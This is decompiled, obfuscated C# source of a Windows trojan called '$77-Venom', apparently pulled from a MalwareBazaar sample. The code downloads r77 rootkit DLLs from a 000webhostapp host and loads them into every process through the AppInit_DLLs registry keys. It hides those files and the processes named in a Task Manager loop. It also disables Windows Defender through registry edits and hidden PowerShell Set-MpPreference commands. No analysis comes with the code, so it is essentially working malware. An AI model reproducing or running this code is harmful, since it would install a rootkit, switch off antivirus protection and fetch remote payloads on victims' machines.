// Decompiled with JetBrains decompiler
// Type: 䭈꬯ሣ芍蜒劸焇�鑧뒰朸ꭼ蟌෰걲不텁Ꮇⵔ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class 䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF
{
  [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
  public static extern IntPtr \u25ADＫ忎墳驴ꯣ轓攤晷豘㨋齑梦餦쥕\u1C8C톿뺔䶝论();

  public static void ᠷᏲꡐ긟䤔䂙\uE6E9붷챈ዱ\uED8B\u0CF3\uEE12㩛\uE9EB\u2530\uFFFD䖡㷨鲅()
  {
    IntPtr num = 䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.\u25ADＫ忎墳驴ꯣ轓攤晷豘㨋齑梦餦쥕\u1C8C톿뺔䶝论();
    竭剞杞\uA9DE\uEAC9쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆\u32BBㅼ첿 竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿 = new 竭剞杞\uA9DE\uEAC9쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆\u32BBㅼ첿(扼嬊\uE960ష輞\uF737廇뼲ퟷﮭ\uFFFD\uE4BE휂ꩽ㰞流㷷⁀隖㗯.ᜎ羵撞뷭있侯\uFFFD畱ⲕ\u20CA桮\uF1CE푇\u2008\uE175蟰ꡏ\uF416୦핓((string) null, "Task Manager"));
    while (竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿.lhWndParent != IntPtr.Zero)
    {
      Console.Write((object) num);
      string procName = Console.In.ReadLine();
      int index = 竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿.\u2798\uFFFDㅏ赮ᅱō僊伛䞵턦\u3377萠䨛ज箉鬆猅갬잷㓕(procName);
      竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿.\uED3F뤅节仑뗡ጪ窣\uE2E1鞃䘟蝓썣쾹\uE8C3\uF651囫煝\uFFFD\u19CC䁣(true);
      竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿.뙬墨崢㚤Ỹ菹\uFFFD䃤㵧峕㒒\u2F68똃Ꙡ䆉餎샨넠鲏ﱋ(index);
      竭剞杞쀐쁹䴌褧熻目䔦㥤Ųᣏᤵ߆ㅼ첿.\uED3F뤅节仑뗡ጪ窣\uE2E1鞃䘟蝓썣쾹\uE8C3\uF651囫煝\uFFFD\u19CC䁣(false);
    }
  }

  public static void 텖\uE3DB㙇\u2F63\uFFFD똭䧳\uED50뼴䢗碑ଆ\uEF6Eᱠ䴼\uF462\uFFFD벾ﵡ\uF06F(bool is64bit)
  {
    string path1 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    if (䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.썐\uE85E稐\u05BE톗癰ዻꃂ컪莐\u0DFA荑㭓鯱鲱\uFFFD츉郋울嬃())
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name1 = "r77-x64.dll";
      string name2 = "r77-x86.dll";
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ᢹ\uFFFDᑯ\u2414猷Ṟ洄䪽䇇쭆\uE3AA\uA7F4퀪ヹ䫦츿좏\uFFFF鳁贤("https://payloads-poison.000webhostapp.com/r77-x64.dll", name1);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ᢹ\uFFFDᑯ\u2414猷Ṟ洄䪽䇇쭆\uE3AA\uA7F4퀪ヹ䫦츿좏\uFFFF鳁贤(link, name2);
      string str1 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str2 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str1);
      File.Copy(Path.Combine(path1, "r77-" + str1), str2);
      new FileInfo(str2).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str2);
      }
      string path2 = Path.Combine(path1, "r77-x64.dll");
      string path3 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path2, FileAttributes.Hidden);
      File.SetAttributes(path3, FileAttributes.Hidden);
    }
    else
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name3 = "r77-x64.dll";
      string name4 = "r77-x86.dll";
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ᢹ\uFFFDᑯ\u2414猷Ṟ洄䪽䇇쭆\uE3AA\uA7F4퀪ヹ䫦츿좏\uFFFF鳁贤("https://payloads-poison.000webhostapp.com/r77-x64.dll", name3);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ᢹ\uFFFDᑯ\u2414猷Ṟ洄䪽䇇쭆\uE3AA\uA7F4퀪ヹ䫦츿좏\uFFFF鳁贤(link, name4);
      string str3 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str4 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str3);
      File.Copy(Path.Combine(path1, "r77-" + str3), str4);
      new FileInfo(str4).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str4);
      }
      string path4 = Path.Combine(path1, "r77-x64.dll");
      string path5 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path4, FileAttributes.Hidden);
      File.SetAttributes(path5, FileAttributes.Hidden);
    }
  }

  public static bool 썐\uE85E稐\u05BE톗癰ዻꃂ컪莐\u0DFA荑㭓鯱鲱\uFFFD츉郋울嬃() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

  public static void 輁㿋쐢瘞꙼샦퍱횯简\u1F17洣럆ꮀ\uFFFD藇럜\uF2ABⷚ堸캻()
  {
    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      return;
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
    䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.㔶핐紬\u176D\u25D2ⶇ\u1378㱐짵ﺬ씟駆\uEF66筍똓㩪ꠏ瀧ಗ뼤();
  }

  private static void ꗊ諬\u2074祹\uFF5E뚦ೊꖛ쳊ꮗ踹鹉\uEBE0\uEB68ᮌṐ飮\uEC96㲤\u228E(
    string regPath,
    string name,
    string value)
  {
    try
    {
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
      {
        if (registryKey == null)
        {
          Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, (object) value, RegistryValueKind.DWord);
        }
        else
        {
          if (registryKey.GetValue(name) == (object) value)
            return;
          registryKey.SetValue(name, (object) value, RegistryValueKind.DWord);
        }
      }
    }
    catch
    {
    }
  }

  private static void 㔶핐紬\u176D\u25D2ⶇ\u1378㱐짵ﺬ씟駆\uEF66筍똓㩪ꠏ瀧ಗ뼤()
  {
    Process process = new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = "Get-MpPreference -verbose",
        UseShellExecute = false,
        RedirectStandardOutput = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    };
    process.Start();
    while (!process.StandardOutput.EndOfStream)
    {
      string str = process.StandardOutput.ReadLine();
      if (str.StartsWith("DisableRealtimeMonitoring") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableRealtimeMonitoring $true");
      else if (str.StartsWith("DisableBehaviorMonitoring") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableBehaviorMonitoring $true");
      else if (str.StartsWith("DisableBlockAtFirstSeen") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableBlockAtFirstSeen $true");
      else if (str.StartsWith("DisableIOAVProtection") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableIOAVProtection $true");
      else if (str.StartsWith("DisablePrivacyMode") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisablePrivacyMode $true");
      else if (str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
      else if (str.StartsWith("DisableArchiveScanning") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableArchiveScanning $true");
      else if (str.StartsWith("DisableIntrusionPreventionSystem") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableIntrusionPreventionSystem $true");
      else if (str.StartsWith("DisableScriptScanning") && str.EndsWith("False"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -DisableScriptScanning $true");
      else if (str.StartsWith("SubmitSamplesConsent") && !str.EndsWith("2"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -SubmitSamplesConsent 2");
      else if (str.StartsWith("MAPSReporting") && !str.EndsWith("0"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -MAPSReporting 0");
      else if (str.StartsWith("HighThreatDefaultAction") && !str.EndsWith("6"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -HighThreatDefaultAction 6 -Force");
      else if (str.StartsWith("ModerateThreatDefaultAction") && !str.EndsWith("6"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -ModerateThreatDefaultAction 6");
      else if (str.StartsWith("LowThreatDefaultAction") && !str.EndsWith("6"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -LowThreatDefaultAction 6");
      else if (str.StartsWith("SevereThreatDefaultAction") && !str.EndsWith("6"))
        䭈\uAB2Fሣ芍蜒劸焇\uFFFD鑧뒰朸ꭼ蟌\u0DF0걲不텁Ꮇⵔ\uF5EF.垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ("Set-MpPreference -SevereThreatDefaultAction 6");
    }
  }

  private static void 垢૮ꗾ뿑\uFFFD\u07FF鼈갟왰캡끮Ⲽ햅쨜\uE209\uFFFD択\u0085\uF451ﻯ(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();
}
